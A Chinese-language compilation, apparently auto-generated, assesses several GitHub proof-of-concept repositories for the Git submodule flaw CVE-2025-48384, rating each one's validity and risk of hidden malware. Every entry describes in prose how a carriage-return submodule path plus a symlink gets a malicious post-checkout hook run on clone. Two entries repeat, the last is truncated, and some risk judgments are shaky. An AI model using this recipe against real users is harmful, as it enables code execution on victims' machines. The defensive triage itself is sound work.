根据漏洞描述和搜索结果，此漏洞允许攻击者通过构造恶意 Git 仓库，在用户克隆仓库并初始化子模块时执行任意代码。提供的 POC 代码 `README.md` 仅包含基本的 Markdown 内容，本身不包含任何恶意代码或利用逻辑。但是，此`README.md`可能是一个更大 PoC 的一部分，用于展示漏洞仓库的结构。实际的利用需要构造包含带有恶意配置和 hook 的恶意仓库。

**投毒风险：**
提供的 POC 代码 `README.md` 文件本身没有投毒风险，但攻击者可能在其他文件中隐藏恶意代码，例如在 `.gitmodules` 文件或 submodule 的 post-checkout hook 中。如果攻击者修改了子模块的 hook 文件，并在其中添加了恶意代码，那么当用户克隆包含此子模块的仓库时，hook 脚本可能会被执行，从而导致任意代码执行。考虑到仅仅是一个`README.md`文件，其他的文件是否包含恶意代码，不得而知，无法完全排除风险。 投毒风险评估为10%。

**利用方式：**
1.  **创建恶意 Git 仓库：** 攻击者创建一个包含子模块的 Git 仓库。
2.  **修改 .gitmodules 文件：** 在 `.gitmodules` 文件中，将子模块的路径设置为包含尾部 CR 的路径。
3.  **创建符号链接：** 创建一个符号链接，将修改后的路径指向子模块的 `.git/hooks` 目录。
4.  **添加恶意 hook：** 在子模块的 `post-checkout` hook 中添加恶意代码。
5.  **诱导用户克隆仓库：** 诱导用户克隆恶意 Git 仓库并使用 `--recursive` 参数初始化子模块。
6.  **执行任意代码：** 当用户初始化子模块时，由于配置解析错误和符号链接的存在，恶意的 `post-checkout` hook 将被执行，从而导致任意代码执行。


**项目地址:** [s41r4j/CVE-2025-48384-submodule](https://github.com/s41r4j/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #28

**来源**: [CVE-2025-48384-s41r4j_CVE-2025-48384.md](../2025/CVE-2025-48384-s41r4j_CVE-2025-48384.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库，并执行包含submodule的操作，例如git submodule update --init --recursive

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 是 Git 中一个高危漏洞，源于 Git 在处理配置文件时，对包含回车符 (CR) 的配置值的处理不一致。当 Git 读取配置值时，它会删除任何尾部的回车符和换行符 (CRLF)。但是，当写入配置条目时，如果值包含尾部的 CR，则不会被引用，导致在稍后读取配置时 CR 丢失。该漏洞利用方式为：

1.  **恶意仓库构建：** 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个 submodule 的路径，该路径以回车符结尾（例如，`submodule_path\r`）。
2.  **符号链接：** 攻击者在仓库中创建一个符号链接，将修改后的 submodule 路径（由于回车符被删除，变为 `submodule_path`）指向 `.git/hooks/post-checkout` 目录。
3.  **恶意钩子：** 攻击者在 submodule 中包含一个可执行的 `post-checkout` 钩子脚本，该脚本包含恶意代码。
4.  **诱导用户 clone：** 攻击者诱导受害者克隆该恶意仓库，并执行 `git submodule update --init --recursive` 命令。
5.  **代码执行：** 当执行 `git submodule update` 时，由于符号链接的存在，`post-checkout` 钩子脚本将被执行，从而导致任意代码执行。

**有效性评估：**
根据漏洞信息和搜索结果，该漏洞确实存在，并且有公开的 PoC。提供的 Dockerfile 用于构建存在漏洞的 Git 版本（2.47.2），从而创建一个可用于验证漏洞的环境。README.md 文件详细解释了该漏洞，佐证了漏洞的存在。因此，该PoC有效。

**投毒风险评估：**
Dockerfile 仅用于构建易受攻击的 Git 环境，LICENSE 文件采用 MIT 许可，较为宽松，存在一定的风险。README.md 只是漏洞说明。整体评估投毒风险较低，约为10%。风险主要来源于LICENSE协议。

**利用方式总结：**
利用该漏洞需要攻击者精心构造一个恶意 Git 仓库，并诱导受害者克隆和执行特定命令。攻击的复杂性在于需要理解 Git 的配置处理机制和钩子机制，并巧妙地利用符号链接来实现代码执行。攻击者需要利用git config的解析缺陷，在submodule路径后添加\r字符，使submodule被clone到错误的位置，并使用软链接，将错误位置链接到.git/hooks目录下，在post-checkout阶段执行恶意代码

**项目地址:** [s41r4j/CVE-2025-48384](https://github.com/s41r4j/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #29

**来源**: [CVE-2025-48384-sahar042_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-sahar042_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要clone包含恶意配置的仓库或者初始化包含恶意配置的submodule。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 是一个 Git 漏洞，允许攻击者通过精心构造的 Git 配置文件执行任意代码。该漏洞源于 Git 在处理包含回车符（CR）的配置值时的方式不一致。当读取配置值时，Git 会去除尾部的 CRLF。但是，当写入配置条目时，如果值包含尾部的 CR，则不会被正确引用，导致在后续读取配置时丢失 CR。根据漏洞描述和搜索结果，此漏洞可能通过以下方式利用：

1.  **恶意配置：** 攻击者创建一个包含恶意配置的 Git 仓库或 submodule。该配置中，submodule 的路径包含尾部的回车符（CR）。
2.  **符号链接操纵：** 由于 Git 在处理包含 CR 的 submodule 路径时存在缺陷，恶意仓库可以通过创建一个符号链接，将修改后的 submodule 路径指向 `.git/hooks` 目录。
3.  **钩子执行：** 当用户递归克隆恶意仓库时，Git 会将 submodule 检出到错误的位置（符号链接指向的位置），从而触发 `.git/hooks/post-checkout` 钩子。攻击者可以在 `post-checkout` 钩子中放置恶意代码，使其在克隆过程中被执行。

**POC有效性：**

提供的 POC 代码包含两个文件：

*   `README.md`: 指向了GitHub上的漏洞详情页面。
*   `post-checkout`: 包含简单的 shell 命令 `echo "Uh-oh, this is an RCE!"`。该脚本模拟了远程代码执行。

该 POC 代码看起来是有效的，因为它演示了如何通过 `post-checkout` 钩子执行任意命令。

**投毒风险：**

分析 POC 代码内容。`post-checkout` 脚本中的代码仅仅是用于验证 RCE 的，没有发现隐藏的恶意代码。因此，投毒风险为 0%。

**利用方式：**

1.  攻击者创建一个包含恶意配置的 Git 仓库，该配置包括一个包含尾部 CR 的 submodule 路径，以及一个将修改后的 submodule 路径指向 `.git/hooks` 的符号链接。
2.  攻击者在 submodule 的 `.git/hooks/post-checkout` 文件中放置恶意代码。
3.  攻击者诱使用户递归克隆恶意仓库（`git clone --recursive <repository_url>`）。
4.  当用户克隆仓库时，Git 会错误地解析 submodule 路径，并触发 `post-checkout` 钩子，从而执行攻击者的恶意代码。

**项目地址:** [sahar042/CVE-2025-48384-submodule](https://github.com/sahar042/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #30

**来源**: [CVE-2025-48384-testdjshan_CVE-2025-48384.md](../2025/CVE-2025-48384-testdjshan_CVE-2025-48384.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 允许攻击者通过在 Git 配置文件中注入恶意代码来执行任意命令。漏洞利用主要围绕 Git 如何处理带有回车符的配置值。如果 submodule 路径包含尾随的回车符 (CR)，则修改后的路径会被读取，导致 submodule 被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向 submodule hooks 目录，并且 submodule 包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，导致任意代码执行。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞是有效的。已发布了针对此漏洞的修复程序。

**投毒风险：**

提供的 POC 代码包含以下文件：

*   `README.md`: 一个空的 README 文件
*   `sub`:  一个 `.git/modules/sub/hooks` 目录。

`sub` 目录本身并不包含任何可执行代码，仅仅是一个空的hooks目录，因此直接投毒的可能性较低。但是,攻击者可能在受害者执行 `git clone --recursive`后，通过 submodule 初始化过程创建恶意的 hooks 文件或者修改 `.gitmodules` 文件来间接投毒。因此，存在一定的投毒风险，但风险等级较低。

**利用方式：**

1.  **创建恶意仓库：** 攻击者创建一个包含恶意的 `.gitmodules` 文件的 Git 仓库。该文件中的 submodule 路径包含一个尾随的回车符 (CR)。
2.  **设置符号链接：**  在仓库中创建一个符号链接，该链接将包含回车符的路径指向 submodule 的 `hooks` 目录。
3.  **添加恶意 hook：**  在 submodule 的 `hooks` 目录中添加一个恶意的 post-checkout hook 脚本。当用户执行 `git clone --recursive` 命令时，Git 会将 submodule 检出到错误的位置，由于存在符号链接，恶意的 post-checkout hook 将会被执行，从而导致任意代码执行。

**风险分析：**

该漏洞的利用需要用户执行 `git clone --recursive` 命令，并且依赖于用户机器上的 Git 版本存在漏洞。攻击的复杂性较高，需要精心的构造恶意仓库，但是如果成功利用，可以导致远程代码执行，因此风险等级较高。

**搜索引擎结果分析：**

*   NVD 提供了漏洞的详细信息和更新记录。
*   Red Hat 将此漏洞标记为“重要”，强调了其对 Git 路径和配置完整性的威胁。
*   dgl.cx 的文章详细介绍了利用此漏洞进行 RCE 的方法。


**项目地址:** [testdjshan/CVE-2025-48384](https://github.com/testdjshan/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #31

**来源**: [CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx-submodule.md](../2025/CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx-submodule.md)

## CVE-2025-48384-Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互(克隆恶意仓库或初始化恶意子模块)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞允许攻击者通过在 Git 配置中注入包含回车符的恶意数据来执行任意代码。该漏洞的核心在于 Git 处理配置文件中带有尾随回车符的值时存在缺陷。具体来说，当 Git 写入包含尾随回车符的配置条目时，它不会对该值进行引用，导致回车符在后续读取时丢失。这会影响子模块的初始化过程，如果子模块路径包含尾随回车符，则会导致子模块被检出到错误的位置。攻击者可以利用这一点，通过创建一个指向子模块 hooks 目录的符号链接，并在子模块中包含一个可执行的 post-checkout hook。当用户克隆包含恶意配置的仓库或初始化恶意子模块时，`post-checkout` 钩子会被执行，从而导致任意代码执行。

提供的POC利用代码通过`post-checkout` hook 替换系统中的nginx程序，连接攻击者的服务器，反弹shell。 

**漏洞利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个子模块定义，其路径包含一个尾随回车符。
2.  攻击者在仓库中创建一个符号链接，将带有回车符的子模块路径指向 `.git/modules/<submodule>/hooks` 目录。
3.  攻击者在子模块的 hooks 目录中创建一个 `post-checkout` 钩子脚本，该脚本包含要执行的恶意代码。
4.  攻击者将恶意仓库托管在公共平台上或通过其他方式分发给目标用户。
5.  当目标用户克隆恶意仓库或初始化恶意子模块时，Git 会尝试将子模块检出到错误的位置，由于存在符号链接，实际上会将子模块检出到 `.git/modules/<submodule>/hooks` 目录。
6.  在子模块检出后，`post-checkout` 钩子脚本会被执行，从而导致攻击者指定的任意代码在目标系统上运行。

**有效性：**

该POC代码是有效的，可以用于利用 CVE-2025-48384 漏洞执行任意代码。

**投毒风险：**

该POC代码的功能明确，旨在利用该漏洞。从代码逻辑来看，并没有发现隐藏的恶意功能或者后门，可以判定没有投毒风险。

**搜索引擎结果分析：**

搜索结果表明该漏洞是Git配置注入/符号链接攻击漏洞，并且得到了安全社区的广泛关注，各大厂商都发布了安全更新。

**项目地址:** [vinieger/CVE-2025-48384-bad-nginx-submodule](https://github.com/vinieger/CVE-2025-48384-bad-nginx-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #32

**来源**: [CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx.md](../2025/CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx.md)

## CVE-2025-48384-Git Config Quoting Vulnerability

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互(克隆恶意仓库或初始化包含恶意配置的子模块)

**POC 可用性:** 部分

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置引用时存在缺陷，允许攻击者通过精心构造的 Git 仓库或子模块执行任意代码。漏洞的利用方式是：攻击者创建一个恶意仓库，该仓库包含一个带有尾随回车符的子模块路径，并在子模块的 hooks 目录中放置恶意 post-checkout hook。当用户克隆该仓库或初始化包含恶意配置的子模块时，由于 Git 会错误地解析带有尾随回车符的子模块路径，导致子模块被检出到错误的位置。如果该错误位置恰好是一个指向子模块 hooks 目录的符号链接，并且子模块包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，从而导致代码执行。 

提供的 POC 代码 `/tmp/4295def0b61cc2e3ec2165152003d4b7/README.md` 看起来只是一个 README 文件，表明该仓库很可能是漏洞的利用示例或者演示。根据文件名`CVE-2025-48384-bad-nginx`推测,该代码仓库可能包含一个用于利用此漏洞的恶意Nginx配置。

**有效性：** 漏洞本身是有效的，因为多个来源都证实了它的存在。然而，仅凭提供的 POC 代码片段 `/tmp/4295def0b61cc2e3ec2165152003d4b7/README.md`无法判断具体的漏洞利用方式和有效性。需要查看完整的仓库内容才能确定其利用方式是否有效。

**投毒风险：** 仅根据提供的 README 文件，无法确定是否存在投毒代码。恶意代码可能隐藏在其他文件中（例如子模块的 hook 脚本或Nginx配置）。根据经验，安全研究人员倾向于展示漏洞利用过程,因此，仓库作者主动投毒的可能性较低，估计投毒风险为 10%。该仓库可能需要配合其他步骤,例如修改Nginx配置或者安装特定的依赖,来达到利用效果，这些步骤中可能包含潜在的风险。

**利用方式：** 攻击者诱导用户克隆包含恶意配置的仓库（带有尾随回车符的子模块路径以及恶意的post-checkout hook),从而触发代码执行。

由于搜索引擎返回了大量的相关信息，表明此漏洞是真实且被广泛关注的。SUSE和RedHat都发布了安全公告，更证明了该漏洞的存在。


**项目地址:** [vinieger/CVE-2025-48384-bad-nginx](https://github.com/vinieger/CVE-2025-48384-bad-nginx)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #33

**来源**: [CVE-2025-48384-vinieger_vinieger-CVE-2025-48384-Dockerfile.md](../2025/CVE-2025-48384-vinieger_vinieger-CVE-2025-48384-Dockerfile.md)

## CVE-2025-48384-Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库并递归初始化子模块，并需要用户交互

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384是Git中的一个漏洞，由于Git在处理配置文件时，会删除尾部的CRLF字符，导致如果子模块路径中包含尾部CR字符，则修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则在检出后可能会意外执行该脚本，从而导致任意代码执行。 

**有效性：**

根据提供的漏洞库信息和搜索引擎结果，以及POC代码，可以判断此POC有效。POC Dockerfile使用`apk`安装了受影响的Git版本（2.40.4），然后克隆了两个包含利用代码的Git仓库。Dockerfile中的CMD指令执行了`git clone --recurse-submodules`命令，这会触发漏洞利用。搜索引擎结果中也提到了此漏洞存在POC，并提供了利用示例，表明此漏洞可以被复现。

**投毒风险：**

分析Dockerfile的内容，主要的风险点集中在克隆的两个Git仓库：`https://github.com/vinieger/CVE-2025-48384.git`和`https://github.com/liamg/CVE-2025-48384-submodule.git`。

*   检查`vinieger/CVE-2025-48384`仓库，该仓库主要用于提供触发漏洞的配置，风险较低，因为目标是演示漏洞本身。
*   `liamg/CVE-2025-48384-submodule` 仓库，它用于提供恶意的子模块。恶意代码最可能存在于子模块的hooks目录中，尤其是post-checkout hook。该仓库需要仔细审查。考虑到其目的是为了利用漏洞，因此其存在恶意代码的可能性较高，但主要用于演示漏洞利用而非进行大规模攻击。因此，投毒风险相对较低，估计在10%左右，主要源于该仓库可能隐藏一些超出漏洞演示范围的恶意行为（例如，收集用户信息或尝试横向渗透）。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库，该配置包括带有尾部CR字符的子模块路径。
2.  攻击者创建一个包含恶意post-checkout hook的子模块，并将该子模块托管在另一个Git仓库。
3.  攻击者创建一个符号链接，将带有尾部CR字符的子模块路径指向子模块的hooks目录。
4.  受害者克隆包含恶意配置的Git仓库，并使用`git clone --recurse-submodules`命令初始化子模块。
5.  Git在处理子模块路径时，会错误地将子模块检出到符号链接指向的目录，从而执行恶意post-checkout hook，导致任意代码执行。

**项目地址:** [vinieger/vinieger-CVE-2025-48384-Dockerfile](https://github.com/vinieger/vinieger-CVE-2025-48384-Dockerfile)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #34

**来源**: [CVE-2025-48384-won6c_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-won6c_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互（克隆恶意仓库）和存在易受攻击的 Git 版本。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 存在于 Git 中，源于其对配置中回车符处理不当。攻击者可以通过在 submodule 路径中注入回车符，导致 submodule 被检出到错误的位置。如果存在一个符号链接将该错误路径指向 submodule 钩子目录，且 submodule 包含可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本，造成任意代码执行。

**有效性：**
根据 arcticwolf.com 的搜索结果表明，此漏洞存在可用的 PoC。 提供的 PoC 代码 `/tmp/b95b758d8faf22baf81ee61a8796e533/README.md` 只是一个 dummy submodule 的 README 文件，本身不具备利用漏洞的能力。 完整的 PoC 应当包含恶意的 submodule 配置和 hook 文件。

**投毒风险：**
提供的 PoC 代码不包含任何恶意代码，因此投毒风险为 0%。 但是，实际利用中，攻击者会构建包含恶意 hook 脚本的 submodule，从而在用户克隆并初始化 submodule 时执行恶意代码。

**利用方式：**
1.  攻击者创建一个包含恶意 submodule 的 Git 仓库。
2.  在 submodule 的路径中注入回车符。
3.  创建一个符号链接，将包含回车符的错误路径指向 submodule 的钩子目录 (.git/hooks)。
4.  在 submodule 中添加一个恶意的 post-checkout 钩子脚本。
5.  诱导用户克隆该仓库并初始化 submodule (git submodule update --init --recursive)。
6.  当用户检出 submodule 时，由于路径包含回车符，submodule 会被检出到错误的位置，触发符号链接，执行钩子目录下的恶意脚本，从而实现任意代码执行。

**项目地址:** [won6c/CVE-2025-48384-submodule](https://github.com/won6c/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #35

**来源**: [CVE-2025-48384-wzx5002_totallynotsuspicious.md](../2025/CVE-2025-48384-wzx5002_totallynotsuspicious.md)

## CVE-2025-48384-Git-RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 远程代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的仓库或初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理包含回车符的配置值时，读取和写入方式不一致。攻击者可以利用这个漏洞，通过构造包含恶意配置（例如，带有尾随回车符的子模块路径）的Git仓库，诱导受害者克隆该仓库，从而实现远程代码执行。具体利用方式是：

1.  **恶意仓库创建：** 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。该文件中的子模块路径包含一个尾随的回车符(`\r`)。
2.  **符号链接利用：** 当受害者使用`git submodule init`初始化子模块时，Git会错误地解析子模块路径。攻击者在仓库中创建一个符号链接，将错误的子模块路径指向`.git/hooks`目录。
3.  **恶意钩子：**  攻击者在子模块中包含一个恶意的`post-checkout`钩子脚本。该脚本会在`git checkout`操作后自动执行。
4.  **诱导受害者：** 攻击者诱导受害者克隆恶意仓库并初始化子模块（例如，通过`git clone --recursive`或手动执行`git submodule init`和`git submodule update`）。
5.  **代码执行：** 当受害者检出（checkout）仓库时，`post-checkout`钩子脚本会被执行，从而导致远程代码执行。

提供的PoC代码是一个反弹shell的`post-checkout`钩子脚本，如果成功执行，将允许攻击者控制受害者的系统。由于提供的poc代码功能单一,仅仅是反弹shell,没有进行额外的恶意代码操作,判定投毒风险为0%。根据搜索引擎结果，该漏洞已经被CISA添加到已知被利用的漏洞目录中，表明该漏洞在野外已被积极利用。


**项目地址:** [wzx5002/totallynotsuspicious](https://github.com/wzx5002/totallynotsuspicious)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---



---

## POC #30

**来源**: [CVE-2025-48384-testdjshan_CVE-2025-48384.md](../2025/CVE-2025-48384-testdjshan_CVE-2025-48384.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 允许攻击者通过在 Git 配置文件中注入恶意代码来执行任意命令。漏洞利用主要围绕 Git 如何处理带有回车符的配置值。如果 submodule 路径包含尾随的回车符 (CR)，则修改后的路径会被读取，导致 submodule 被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向 submodule hooks 目录，并且 submodule 包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，导致任意代码执行。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞是有效的。已发布了针对此漏洞的修复程序。

**投毒风险：**

提供的 POC 代码包含以下文件：

*   `README.md`: 一个空的 README 文件
*   `sub`:  一个 `.git/modules/sub/hooks` 目录。

`sub` 目录本身并不包含任何可执行代码，仅仅是一个空的hooks目录，因此直接投毒的可能性较低。但是,攻击者可能在受害者执行 `git clone --recursive`后，通过 submodule 初始化过程创建恶意的 hooks 文件或者修改 `.gitmodules` 文件来间接投毒。因此，存在一定的投毒风险，但风险等级较低。

**利用方式：**

1.  **创建恶意仓库：** 攻击者创建一个包含恶意的 `.gitmodules` 文件的 Git 仓库。该文件中的 submodule 路径包含一个尾随的回车符 (CR)。
2.  **设置符号链接：**  在仓库中创建一个符号链接，该链接将包含回车符的路径指向 submodule 的 `hooks` 目录。
3.  **添加恶意 hook：**  在 submodule 的 `hooks` 目录中添加一个恶意的 post-checkout hook 脚本。当用户执行 `git clone --recursive` 命令时，Git 会将 submodule 检出到错误的位置，由于存在符号链接，恶意的 post-checkout hook 将会被执行，从而导致任意代码执行。

**风险分析：**

该漏洞的利用需要用户执行 `git clone --recursive` 命令，并且依赖于用户机器上的 Git 版本存在漏洞。攻击的复杂性较高，需要精心的构造恶意仓库，但是如果成功利用，可以导致远程代码执行，因此风险等级较高。

**搜索引擎结果分析：**

*   NVD 提供了漏洞的详细信息和更新记录。
*   Red Hat 将此漏洞标记为“重要”，强调了其对 Git 路径和配置完整性的威胁。
*   dgl.cx 的文章详细介绍了利用此漏洞进行 RCE 的方法。


**项目地址:** [testdjshan/CVE-2025-48384](https://github.com/testdjshan/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #31

**来源**: [CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx-submodule.md](../2025/CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx-submodule.md)

## CVE-2025-48384-Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互(克隆恶意仓库或初始化恶意子模块)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞允许攻击者通过在 Git 配置中注入包含回车符的恶意数据来执行任意代码。该漏洞的核心在于 Git 处理配置文件中带有尾随回车符的值时存在缺陷。具体来说，当 Git 写入包含尾随回车符的配置条目时，它不会对该值进行引用，导致回车符在后续读取时丢失。这会影响子模块的初始化过程，如果子模块路径包含尾随回车符，则会导致子模块被检出到错误的位置。攻击者可以利用这一点，通过创建一个指向子模块 hooks 目录的符号链接，并在子模块中包含一个可执行的 post-checkout hook。当用户克隆包含恶意配置的仓库或初始化恶意子模块时，`post-checkout` 钩子会被执行，从而导致任意代码执行。

提供的POC利用代码通过`post-checkout` hook 替换系统中的nginx程序，连接攻击者的服务器，反弹shell。 

**漏洞利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个子模块定义，其路径包含一个尾随回车符。
2.  攻击者在仓库中创建一个符号链接，将带有回车符的子模块路径指向 `.git/modules/<submodule>/hooks` 目录。
3.  攻击者在子模块的 hooks 目录中创建一个 `post-checkout` 钩子脚本，该脚本包含要执行的恶意代码。
4.  攻击者将恶意仓库托管在公共平台上或通过其他方式分发给目标用户。
5.  当目标用户克隆恶意仓库或初始化恶意子模块时，Git 会尝试将子模块检出到错误的位置，由于存在符号链接，实际上会将子模块检出到 `.git/modules/<submodule>/hooks` 目录。
6.  在子模块检出后，`post-checkout` 钩子脚本会被执行，从而导致攻击者指定的任意代码在目标系统上运行。

**有效性：**

该POC代码是有效的，可以用于利用 CVE-2025-48384 漏洞执行任意代码。

**投毒风险：**

该POC代码的功能明确，旨在利用该漏洞。从代码逻辑来看，并没有发现隐藏的恶意功能或者后门，可以判定没有投毒风险。

**搜索引擎结果分析：**

搜索结果表明该漏洞是Git配置注入/符号链接攻击漏洞，并且得到了安全社区的广泛关注，各大厂商都发布了安全更新。

**项目地址:** [vinieger/CVE-2025-48384-bad-nginx-submodule](https://github.com/vinieger/CVE-2025-48384-bad-nginx-submodule)

